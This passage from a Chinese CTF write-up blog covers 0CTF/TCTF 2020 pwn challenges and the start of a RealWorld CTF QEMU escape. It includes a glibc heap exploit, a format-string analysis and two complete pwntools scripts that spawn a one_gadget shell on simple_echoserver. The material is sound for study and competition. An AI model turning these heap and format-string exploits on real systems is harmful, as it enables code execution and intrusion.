class="line">  new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">  new(fuck[<span class="number">1</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">  remove(fuck[<span class="number">0</span>])</span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line">  new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">  new(fuck[<span class="number">1</span>],p64(<span class="number">0x91</span>)*<span class="number">31</span> + p64(<span class="number">0x421</span>) + <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x88</span> + p64(<span class="number">0x21</span>)*<span class="number">11</span>)</span><br><span class="line">  remove(fuck[<span class="number">0</span>])</span><br><span class="line">  show(fuck[<span class="number">1</span>])</span><br><span class="line">  r.recv(<span class="number">0x10d</span>-<span class="number">8</span>)</span><br><span class="line">  heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\\x00&quot;</span>)) - <span class="number">0x4d90</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;heap = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap)))</span><br><span class="line">  global_max_fast = <span class="number">0x1e7600</span> + libc</span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line">  new(fuck[<span class="number">1</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x90</span>)</span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line">  new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">  new(fuck[<span class="number">1</span>],<span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0x421</span>) + p64(global_max_fast-<span class="number">0x20</span>)*<span class="number">2</span> + p64(global_max_fast-<span class="number">0x20</span>)*<span class="number">2</span> + <span class="string">b&quot;A&quot;</span>*<span class="number">0xc0</span>)</span><br><span class="line">  remove(fuck[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;libc = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc)))</span><br><span class="line"></span><br><span class="line">  _IO_wfile_sync = libc + <span class="number">0x1e5fc0</span></span><br><span class="line">  magic = libc + <span class="number">0x000000000012be97</span> <span class="comment"># mov    rdx,QWORD PTR [rdi+0x8] ; mov    rax,QWORD PTR [rdi] ; mov    rdi,rdx ; jmp    rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;_IO_wfile_sync = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(_IO_wfile_sync)))</span><br><span class="line">  payload = <span class="string">b&quot;Z&quot;</span>*<span class="number">0x30</span></span><br><span class="line">  setcontext = <span class="number">0x55e35</span> + libc</span><br><span class="line">  payload += p64(setcontext) + p64(heap + <span class="number">0x4df0</span>)+ <span class="string">b&quot;\\x00&quot;</span>*<span class="number">0x10</span> + p64(magic)</span><br><span class="line">  payload += cyclic(<span class="number">96</span>) + p64(heap) + p64(<span class="number">0x21000</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">7</span>)*<span class="number">3</span> + p64(heap+<span class="number">0x4ea0</span>)</span><br><span class="line">  payload += p64(libc + <span class="number">0x117590</span>) + p64(heap+<span class="number">0x4ea8</span>)</span><br><span class="line">  payload += (asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)) +</span><br><span class="line">              asm(shellcraft.read(<span class="string">&quot;rax&quot;</span>,heap+<span class="number">0x100</span>,<span class="number">0x100</span>)) +</span><br><span class="line">              asm(shellcraft.write(<span class="number">1</span>,heap+<span class="number">0x100</span>,<span class="string">&quot;rax&quot;</span>)) + <span class="string">b&quot;\\xeb\\xfe&quot;</span>)</span><br><span class="line">  payload = payload.ljust(<span class="number">0x3f0</span>,<span class="string">b&quot;F&quot;</span>)</span><br><span class="line"></span><br><span class="line">  new(fuck[<span class="number">0</span>],payload) <span class="comment"># large bin attack success</span></span><br><span class="line"></span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line">  new(fuck[<span class="number">1</span>],<span class="string">b&quot;C&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0x421</span>) + p64(libc + <span class="number">0x1e5090</span>)*<span class="number">2</span> + p64(heap+<span class="number">0x2c20</span>)*<span class="number">2</span> + p64(<span class="number">0x21</span>)*<span class="number">24</span>) <span class="comment"># fix large bin</span></span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line">  remove(fuck[<span class="number">0</span>])</span><br><span class="line">  new(fuck[<span class="number">0</span>],<span class="string">&quot;A&quot;</span>*<span class="number">0x98</span>)</span><br><span class="line">  new(fuck[<span class="number">1</span>],<span class="string">b&quot;D&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0xf1</span>) + <span class="string">b&quot;D&quot;</span>*<span class="number">0xe0</span>)</span><br><span class="line">  remove(fuck[<span class="number">0</span>])</span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line">  new(fuck[<span class="number">1</span>],<span class="string">b&quot;D&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0xf1</span>) + p64(libc + <span class="number">0x1e575b</span>) + <span class="string">b&quot;D&quot;</span>*<span class="number">0xe0</span>)</span><br><span class="line">  remove(fuck[<span class="number">1</span>])</span><br><span class="line">  new(fuck[<span class="number">0</span>],<span class="string">&quot;D&quot;</span>*<span class="number">0xe8</span>)</span><br><span class="line">  payload = (p64(<span class="number">0x00000000fbad2887</span>) +</span><br><span class="line">              p64(libc + <span class="number">0x1e57e3</span>)*<span class="number">7</span> +</span><br><span class="line">              p64(<span class="number">0</span>)*<span class="number">7</span> +</span><br><span class="line">              p64(<span class="number">0xffffffffffffffff</span>) +</span><br><span class="line">              p64(<span class="number">0</span>) +</span><br><span class="line">              p64(libc + <span class="number">0x1e7580</span>) +</span><br><span class="line">              p64(<span class="number">0xffffffffffffffff</span>) +</span><br><span class="line">              p64(heap + <span class="number">0x4dd0</span>) +</span><br><span class="line">              p64(heap + <span class="number">0x4da0</span>) +</span><br><span class="line">              p64(<span class="number">0</span>)*<span class="number">3</span> +</span><br><span class="line">              p64(<span class="number">0x00000000ffffffff</span>) +</span><br><span class="line">              p64(<span class="number">0</span>)*<span class="number">2</span> +</span><br><span class="line">              p64(_IO_wfile_sync - <span class="number">0x38</span>) )</span><br><span class="line">  payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\\x00&quot;</span>)</span><br><span class="line">  context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">  gdb.attach(r, <span class="string">&quot;b *0x555555555BC7&quot;</span>)</span><br><span class="line">  <span class="comment"># Fastbin attack stdout to get stdout buffer (stdout flag is 0x000000fbxxxxxx, so 0x000000fb can use to be fastbin size).</span></span><br><span class="line">  <span class="comment"># Change puts stdout vtable to _IO_wfile_sync, and contorl rip &amp; rdi</span></span><br><span class="line">  <span class="comment"># Jump magic and setcontext to call mportect, and finally execute shellcode</span></span><br><span class="line">  new(fuck[<span class="number">1</span>],payload[<span class="number">0xb</span>:<span class="number">0xb</span>+<span class="number">0xe8</span>])</span><br><span class="line">  r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="simple-server"><a href="#simple-server" class="headerlink" title="simple_server"></a>simple_server</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>程序保护全开，存在一个格式化字符串漏洞</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled%205.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled%205.png"></p><p>但是远程将<code>stderr</code>重定向到了<code>/dev/null</code>，无法进行泄露，而且正常情况下格式化字符串漏洞只能调用一次。先来看一下<code>fprintf</code>处的栈数据。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled%206.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled%206.png"></p><p>函数发生的调用是<code>main-&gt;sub_141d-&gt;sub_13c1-&gt;fprintf</code>。这里的<code>rbp</code>链是<code>0x7fffffffe430 —▸ 0x7fffffffe550 —▸ 0x7fffffffe570</code>。</p><p>如果我们更改了<code>e550</code>中存储的地址的低字节，那么在<code>141d</code>函数返回的时候就可以劫持栈到修改的地址，如果在此处提前布置好<code>one_gadget</code>就可以<code>getshell</code>。</p><p>但是无法泄露地址，也就是无法得到<code>one_gadget</code>的实际地址，需要在栈中找到一个<code>libc</code>附近的地址，然后覆写其低四字节内容，从而得到<code>one_gadget</code>的实际地址。注意的是这里只能覆写低四字节的内容，因为<code>%n</code>不能超过<code>int</code> 的范围，也就是<code>0x7fffffff</code>。</p><p>从汇编代码来看<code>141d</code>和<code>readint(12c9)</code>函数是共用一部分栈空间的，栈中<code>0x7fffffffe4c8</code>地址处在<code>readint</code>中存储的是<code>nptr</code>的地址，也就是一个栈地址，并且随着输入的<code>phone_number</code>的字符串的长度的增加而增加，其初始值为<code>x7fffffffe4d0</code>，而改地址<code>+0x18</code>的位置存储了一个<code>libc</code>附近的地址，因此只要控制<code>phone_number</code>的长度为<code>0x18</code>就可以获得一个指向存储有<code>libc</code>附近地址的指针，就可以使用格式化字符串来修改指向的<code>libc</code>附近的地址为<code>one_gadget</code>的地址。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled%207.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled%207.png"></p><p>如果只是单纯的修改<code>one_gadget</code>的偏移，需要爆破的位数过多，这里学到一种方法就是利用<code>%*$c</code>或者<code>%*m$c</code>来指定输出的长度。这里这个<code>m</code>是第几个参数的意思，例如</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled%208.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled%208.png"></p><p>假设需要将<code>libc</code>附近的地址改为<code>libc_base+0xe58c3</code>，在上图中改地址为<code>0x7fdb136bb8c3</code>，<code>fprintf</code>函数的第<code>30</code>个参数也就是<code>libc</code>附近初始值为<code>0x7fdb13664400</code>，因此需要将改地址<code>+0x7fdb135d6000 + 0xe58c3 - 0x7fdb13664400</code>个大小。格式化字符串如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;%&#123;&#125;c%*30$c%26$n&quot;</span>.<span class="built_in">format</span>(<span class="number">0x7fdb135d6000</span> + <span class="number">0xe58c3</span> - <span class="number">0x7fdb13664400</span> - <span class="number">0xd</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的<code>%*30%c</code>就是取第<code>30</code>个参数作为长度，也就是<code>%325469184$c</code>，<code>0x13664400=325469184</code>。最终将<code>libc</code>附近的地址改为我们想要的地址。这里就相当于绕过了地址随机化。</p><p>在调试的时候需要注意满足两个条件才可以（如上图），一个是<code>rbp</code>的低一字节地址需要<code>&gt;0xd0</code>，这样才可以改写栈地址指向<code>one_gadget-0x8</code>的位置，第二个就是<code>libc</code>的地址的低四字节需要大于<code>0x7fffffff</code>，因为大于<code>0x7fffffff</code>之后会被认为是负数。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./simple_echoserver&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    p = process([file_path,], stderr=f)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0x13FF)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    onegadget = <span class="number">0xe58c3</span></span><br><span class="line">    name = <span class="string">&quot;%&#123;&#125;c%7$hhn%&#123;&#125;c%*30$c%26$n&quot;</span>.<span class="built_in">format</span>(<span class="number">0x50</span> - <span class="number">0xd</span>, <span class="number">0x7fdb135d6000</span> + onegadget - <span class="number">0x7fdb13664400</span> - <span class="number">0x50</span>)</span><br><span class="line">    phone_num = <span class="string">&quot;2&quot;</span> * <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your name: &quot;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your phone: &quot;</span>, phone_num)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enjoy yourself!\\n&quot;</span>, <span class="string">&quot;~.&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendline(<span class="string">&quot;echo success&quot;</span>)</span><br><span class="line">        res = p.recvuntil(<span class="string">&quot;success&quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">raise</span> EOFError</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> exploit():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p = process([file_path, ], stderr=f)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><p>再来看一下调用<code>sprintf</code>函数时候的栈数据</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled%209.png" alt="2020%200CTF%20TCTF%20quals%20%E9%83%A8%E5%88%86PWN%20WriteUp%20b6f5a2be70dd429dbfc595d0e170347f/Untitled%209.png"></p><p>在<code>rop</code>链的最后一条地址，程序返回之后会执行最后一个<code>rbp(0xe570)</code>地址中存储的返回地址，之后就会执行<code>0xe578</code>中存储的<code>libc_start_main+231</code>的指令，也就是执行<code>exit</code>。如果我们修改<code>0xe578</code>中存储的<code>libc_start_main</code>指令地址为<code>one_gadget</code>地址，这样的话在程序返回的时候就会执行<code>one_gadget</code>，从而<code>getshell</code>。需要注意的是在更改得到<code>one_gadget</code>地址之后需要将原<code>RBP</code>链复位，使得程序能正常返回。这里在运行<code>one_gadget</code>的时候环境发生改变，新的<code>gadget</code>的地址为<code>0x4f3c2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./simple_echoserver&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    p = process([file_path,], stderr=f)</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0x13FF)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    onegadget = <span class="number">0x4f3c2</span></span><br><span class="line">    name = <span class="string">&quot;%c%c%c%c%c%&#123;&#125;c%hhn%&#123;&#125;c%*48$c%43$n%&#123;&#125;c%7$hhn&quot;</span>\\</span><br><span class="line">        .<span class="built_in">format</span>(<span class="number">0xf8</span> - <span class="number">0xd</span> - <span class="number">0x5</span>,</span><br><span class="line">                <span class="number">0x7f111588d000</span> + onegadget - <span class="number">0x7f11158aeb97</span> - <span class="number">0xf8</span>,</span><br><span class="line">                (<span class="number">0xf0</span>-<span class="number">0xc2</span>+<span class="number">0x100</span>)%<span class="number">0x100</span>)</span><br><span class="line">    phone_num = <span class="string">&quot;2&quot;</span> * <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your name: &quot;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your phone: &quot;</span>, phone_num)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enjoy yourself!\\n&quot;</span>, <span class="string">&quot;~.&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendline(<span class="string">&quot;echo success&quot;</span>)</span><br><span class="line">        res = p.recvuntil(<span class="string">&quot;success&quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">raise</span> EOFError</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> exploit():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p = process([file_path, ], stderr=f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exploit()</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="解2"><a href="#解2" class="headerlink" title="解2"></a>解2</h3><p>这种方法没有用到<code>%*</code>来使用参数指定输出的长度，而是利用栈中<code>0xe480/0xe498</code>中存储的<code>_start</code>地址通过将改写<code>rbp</code>链将栈迁移到<code>0xe490</code>地址处，函数返回的时候就会进入<code>_start</code>函数，从而无限次利用格式化字符串漏洞。</p><p>此时就可以修改<code>stderr</code>，将其修改为<code>stdout</code>(修改<code>_fileno</code>成员变量为<code>1</code>)。这里可以利用栈中残留的<code>_IO_2_1_stdin_</code>指针，改指针在一般情况下与<code>_IO_2_1_stderr_</code>指针仅低两字节不同，而低<code>3</code>位数字是<code>offset</code>不受<code>ASLR</code>的影响，因此只需要爆破一位数字即可。那么首先修改一个栈地址，指向存储<code>_IO_2_1_stdin_</code>的位置，接着将<code>_IO_2_1_stdin_</code>修改为<code>_IO_2_1_stderr_._fileno</code>附近的地址，再次修改<code>_fileno</code>即可利用格式化字符串泄露<code>libc</code>地址，接着覆写返回地址为<code>one_gadget</code>即可<code>getshell</code>。具体参考<a href="https://kirin-say.top/2020/06/29/0CTF-TCTF-2020-Quals-PWN/">这篇文章</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kirin-say.top/2020/06/29/0CTF-TCTF-2020-Quals-PWN/">0CTF/TCTF 2020 Quals PWN</a></p><p><a href="https://www.anquanke.com/post/id/210160">2020 0CTF/TCTF quals Duet writeup</a></p><p><a href="https://balsn.tw/ctf_writeup/20200627-0ctf_tctf2020quals/#duet">0CTF/TCTF 2020 Quals</a></p><p><a href="https://github.com/hzqmwne/my-ctf-challenges/blob/master/0CTF_TCTF-2020-Quals/simple_echoserver/writeup/writeup_zh.md">simple echoserver Wp</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020 RealWorld CTF easy_escape</title>
      <link href="/posts/599480916.html"/>
      <url>/posts/599480916.html</url>
      
        <content type="html"><![CDATA[<h2 id="easy-escape"><a href="#easy-escape" class="headerlink" title="easy_escape"></a>easy_escape</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先看一下启动程序<code>run.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#Using to build docker environment</span></span><br><span class="line"><span class="comment">#export LD_LIBRARY_PATH=/lib/x86_64-linux-gnu/pulseaudio</span></span><br><span class="line">./qemu-system-x86_64 -L ./dependency -kernel ./vmlinuz-5.4.0-58-generic -initrd ./rootfs.cpio -cpu kvm64,+smep \\</span><br><span class="line">-m 64M \\</span><br><span class="line">-monitor none \\</span><br><span class="line">-device fun \\</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \\</span><br><span class="line">-nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞肯定位于<code>fun</code>设备中，用<code>ida</code>分析一下<code>qemu-system-x86_64</code>，从<code>fun_class_init</code>函数中我们可以得到<code>vendor_id,class_id</code>。在<code>qemu</code>中查看一下<code>resource</code>，看到只有一个内存空间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># lspci</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: cafe:babe</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">/ <span class="comment"># cat /sys/devices/pci0000\\:00/0000\\:00\\:04.0/resource</span></span><br><span class="line">0x00000000febf1000 0x00000000febf1fff 0x0000000000040200</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们直接进入<code>mmio_read/write</code>函数进行分析，先来看一下<code>mmio_write</code>函数。其中<code>FunState</code>的结构如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00000000 FunState        struc ; (sizeof=0xA00, align=0x10, copyof_4860)</span><br><span class="line">00000000 pdev            PCIDevice_0 ?</span><br><span class="line">000008F0 mmio            MemoryRegion_0 ?</span><br><span class="line">000009E0 addr            <span class="built_in">dd</span> ?</span><br><span class="line">000009E4 size            <span class="built_in">dd</span> ?</span><br><span class="line">000009E8 idx             <span class="built_in">dd</span> ?</span><br><span class="line">000009EC result_addr     <span class="built_in">dd</span> ?</span><br><span class="line">000009F0 req             dq ?                    ; offset</span><br><span class="line">000009F8 as              dq ?                    ; offset</span><br><span class="line">00000A00 FunState        ends</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">fun_mmio_write</span><span class="params">(FunState *opaque, hwaddr cmd, uint32_t_0 val)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      opaque-&gt;size = val;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span 